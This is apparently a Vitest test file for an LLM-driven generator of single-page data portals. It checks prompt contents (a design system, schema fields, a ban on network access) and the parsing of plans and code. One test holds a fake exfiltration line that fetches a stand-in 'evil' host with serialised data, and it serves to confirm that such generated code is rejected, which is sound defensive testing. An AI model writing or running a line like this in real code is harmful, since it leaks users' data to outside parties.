import { describe, it, expect, vi, beforeEach } from 'vitest'

const mockChat = vi.fn()
vi.mock('./llm', () => ({
  chatComplete: (...a: unknown[]) => mockChat(...a),
  chatCompleteStream: (...a: unknown[]) => mockChat(...a),
}))

const { generateSite, planSite } = await import('./dataviz')
const { DEFAULT_SETTINGS } = await import('../types')

const settings = { ...DEFAULT_SETTINGS, openaiBaseUrl: 'https://api.example.com/v1', openaiApiKey: 'sk', openaiModel: 'gpt-4o' }
const input = {
  schema: [{ name: '地区', type: 'Text' }, { name: '销量', type: 'Number' }],
  sampleRows: [{ 地区: '华东', 销量: '100' }],
  request: '做一个销售门户',
}
const reply = (s: string) => mockChat.mockResolvedValue(s)

describe('generateSite', () => {
  beforeEach(() => mockChat.mockReset())

  it('parses {title,code}; prompt advertises the design system, forbids network, passes ref URL + plan + schema', async () => {
    reply(JSON.stringify({ title: '销售门户', code: 'container.innerHTML="<div class=site></div>"' }))
    const r = await generateSite(settings, { ...input, refUrl: 'https://stripe.com', planText: '{"title":"x"}' })
    expect(r.name).toBe('销售门户')
    expect(r.code).toContain('class=site')
    const sent = mockChat.mock.calls[0][1] as string
    expect(sent).toContain('.hero')              // design-system cheatsheet
    expect(sent).toContain('禁止 fetch')          // network forbidden
    expect(sent).toContain('https://stripe.com') // reference URL as a style hint
    expect(sent).toContain('地区')               // schema
    expect(sent).toContain('ui.table')           // reliable data grid (search/sort/pagination)
    expect(sent).toContain('ui.dashboard')       // reactive filter→KPI/chart/table primitive
    expect(sent).toContain('单页')               // single page — no tabs / jumps
  })

  it('multi-table: prompt advertises the datasets global and lists the other sub-tables to join', async () => {
    reply(JSON.stringify({ title: 'x', code: 'container.innerHTML="<div class=site></div>"' }))
    await generateSite(settings, {
      ...input,
      otherTables: [{ name: '客户表', schema: [{ name: '客户ID', type: 'Text' }], sampleRows: [{ 客户ID: 'C1' }] }],
    })
    const sent = mockChat.mock.calls[0][1] as string
    expect(sent).toContain('datasets')   // the multi-table runtime global
    expect(sent).toContain('客户表')      // the other sub-table is listed
    expect(sent).toContain('客户ID')      // ...with its real field name to join on
  })

  it('field list surfaces real sample values and the prompt carries type-aware chart guidance', async () => {
    reply(JSON.stringify({ title: 'x', code: 'container.innerHTML=""' }))
    await generateSite(settings, {
      ...input,
      schema: [
        { name: '日期', type: 'DateTime', samples: ['2024-01-01', '2024-02-01'] },
        { name: '金额', type: 'Number', samples: ['¥100', '¥200'] },
      ],
    })
    const sent = mockChat.mock.calls[0][1] as string
    expect(sent).toContain('样本: 2024-01-01') // real sample values surfaced to the model
    expect(sent).toContain('DateTime')          // type carried through
    expect(sent).toContain('时间序列')          // type-aware guidance block present
    expect(sent).toContain('货币')              // currency formatting hint
  })

  it('rejects generated code containing forbidden network calls', async () => {
    reply(JSON.stringify({ title: 'x', code: 'fetch("https://evil/?d="+JSON.stringify(data))' }))
    await expect(generateSite(settings, input)).rejects.toThrow(/被禁止/)
  })

  it('refine path edits the previous code (hands it back, keep-the-rest)', async () => {
    reply(JSON.stringify({ title: 'x', code: 'container.innerHTML="<div></div>"' }))
    await generateSite(settings, { ...input, previousCode: 'var KEEP=1; container.innerHTML="<div class=hero></div>"' })
    const sent = mockChat.mock.calls[0][1] as string
    expect(sent).toContain('KEEP')      // previous code handed back
    expect(sent).toContain('逐字保留')   // the edit prompt
  })

  it('throws on non-JSON output', async () => {
    reply('就是一段普通文字')
    await expect(generateSite(settings, input)).rejects.toThrow(/JSON/)
  })
})

describe('planSite', () => {
  beforeEach(() => mockChat.mockReset())

  it('parses {title,sections,fields,question}', async () => {
    reply(JSON.stringify({ title: '门户', sections: ['英雄区', '指标'], fields: ['地区', '销量'], question: '要按月还是按季？' }))
    const p = await planSite(settings, input)
    expect(p.title).toBe('门户')
    expect(p.sections).toEqual(['英雄区', '指标'])
    expect(p.fields).toEqual(['地区', '销量'])
    expect(p.question).toContain('按月还是按季')
  })

  it('tolerates missing fields with sane defaults', async () => {
    reply(JSON.stringify({ title: 'x' }))
    const p = await planSite(settings, input)
    expect(p.sections).toEqual([])
    expect(p.fields).toEqual([])
    expect(p.question).toBeUndefined()
  })
})
